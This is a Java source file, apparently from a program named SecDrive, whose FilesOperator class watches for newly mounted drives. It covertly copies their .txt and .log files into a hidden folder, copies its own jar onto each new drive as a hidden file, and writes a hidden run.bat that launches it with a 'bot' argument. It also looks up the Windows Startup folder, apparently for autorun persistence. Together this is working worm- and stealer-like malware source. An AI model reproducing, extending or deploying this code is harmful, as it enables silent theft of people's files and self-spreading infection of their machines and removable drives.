package pl.kkogut;

import java.io.*;
import java.net.URLDecoder;
import java.nio.charset.Charset;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.StandardCopyOption;
import java.io.BufferedWriter;
import java.security.CodeSource;

public class FilesOperator {
    static File archive = createPath("C:/temp/secDrive", true);
    static File[] drivesList = File.listRoots();

    public static File createPath(String pathname, boolean hidden) {
        File path = new File(pathname);
        try{
            if (!path.exists()) {
                Files.createDirectory(path.toPath());
                if (hidden) hideFile(path);
                System.out.println("Path created = " + path.toPath());
            }
        }catch (IOException e){
            System.out.println("Upc, Can't crete a dir "+path.getAbsolutePath());
            e.printStackTrace();
        }
        return path;
    }
    public static void driveChanged() {
        if(File.listRoots().length > drivesList.length){
            System.out.println("Drive mounted!");
            File newDrive = File.listRoots()[File.listRoots().length-1];
            System.out.println(newDrive.getAbsolutePath());
            copy(getTxtFiles(newDrive),archive,false);
            copyJarFile(newDrive.toString(), false);
            drivesList = File.listRoots();
        }
        else if (File.listRoots().length< drivesList.length){
            System.out.println("Drive unmounted!");
            drivesList = File.listRoots();
        }

    }

    private static File[] getTxtFiles(File searchPath) {
        File[] matchingFiles = searchPath.listFiles((dir, name) -> name.endsWith("txt") || name.endsWith("log"));
        return matchingFiles;
    }


    public static String getJarFilePath(Class aclass){
        try {
            CodeSource codeSource = aclass.getProtectionDomain().getCodeSource();

            File jarFile;

            if (codeSource.getLocation() != null) {
                jarFile = new File(codeSource.getLocation().toURI());
            } else {
                String path = aclass.getResource(aclass.getSimpleName() + ".class").getPath();
                String jarFilePath = path.substring(path.indexOf(":") + 1, path.indexOf("!"));
                jarFilePath = URLDecoder.decode(jarFilePath, "UTF-8");
                jarFile = new File(jarFilePath);
            }
            System.out.println("jarFile.getAbsolutePath() = " + jarFile.getAbsolutePath());
            return jarFile.getAbsolutePath();
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }
//    private static File getJarFilePath() throws IOException, URISyntaxException {
//        String file = SecDrive.class.getProtectionDomain().getCodeSource().getLocation().getPath();
//        System.out.println("JAR path = " + file);
//        return new File(file);
////        return new File(System.getProperty("java.class.path"));
//    }
    public static void copyJarFile(){
        copyJarFile(FilesOperator.archive.toString(), false);
    }
    public static void copyJarFile(String destination, boolean hidden){
        createPath(destination, true);
        try{
            File jarFile = new File(getJarFilePath(SecDrive.class));
            File destJarFile = new File(destination + "/" + jarFile.getName());
            System.out.println("destJarFile = " + destJarFile);
            copy(jarFile, destJarFile, hidden);
            saveBatFile(destJarFile, destination+"/run.bat");
        } catch (Exception e){
            e.printStackTrace();
        }
    }

    public static void copy(File[] fromFiles, File toFolder, boolean hidden){
        for (File file:fromFiles){
            File destFile = new File(toFolder.toString()+"/txt/"+file.getName());
            copy(file, destFile, true);
        }
    }

    public static void copy(File from, File to, boolean hidden){
        File path = to.getParentFile();
        try {
            createPath(path.getAbsolutePath(), true);
            Files.copy(from.toPath(), to.toPath() , StandardCopyOption.REPLACE_EXISTING);
            if(hidden) hideFile(to);
            System.out.println("File copied to = " + to);

        } catch (IOException ioe){
            System.out.println("Ups, Can't copy file to "+to.getAbsolutePath());
        }

    }

    private static void saveBatFile(File jarFile, String savePath){
        String bat = "start javaw -Xmx200m -jar "+ jarFile.getAbsolutePath()+" bot";
        File file  =  saveFile(bat, savePath, true);
        hideFile(file);

    }

    public static File saveFile(String fileContent, String fileName, boolean isPathAbsolute) {
        if(!isPathAbsolute){
            fileName = FilesOperator.archive + "/"+ fileName;
        }
        return saveFile(fileContent,fileName);
    }

    private static File saveFile(String fileContent, String fileName){
        File file = new File(fileName);
        try(BufferedWriter writer = Files.newBufferedWriter(file.toPath(), Charset.forName("UTF-8"))){
            writer.write(fileContent);
            System.out.println("File saved: "+ file.getAbsolutePath());
            return file;
        }catch(IOException ex){
            System.out.println("Ups, Can't SaveFile "+ file.getAbsolutePath());
        }
        return null;
    }
    public static File saveFile(BufferedReader reader, String fileName) {
        File file = new File(FilesOperator.archive + "/"+System.currentTimeMillis() +fileName);

        try(FileWriter fileWriter = new FileWriter(file);
            BufferedWriter writer = new BufferedWriter(fileWriter);){
            String line;
            while ((line = reader.readLine())!=null){
                writer.write(line);
            }
            System.out.println("File saved: "+ file.getAbsolutePath());
            return file;
        } catch (IOException ioe){
            System.out.println("Ups, Can't SaveFile from BufferReader "+ file.getAbsolutePath());
        }
        return null;
    }
    public static void hideFile(File file){
        try {
            Files.setAttribute(file.toPath(), "dos:hidden", true, LinkOption.NOFOLLOW_LINKS);
        } catch (IOException e) {
            System.out.println("Ups, Can't hide file "+file.getAbsolutePath());
        }
    }
    public static File getAutorunPath(){
        String pathStr = System.getProperty("user.home")+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
        File path = new File(pathStr);
        System.out.println("Path of bat = " + pathStr);
        return path;
    }


}
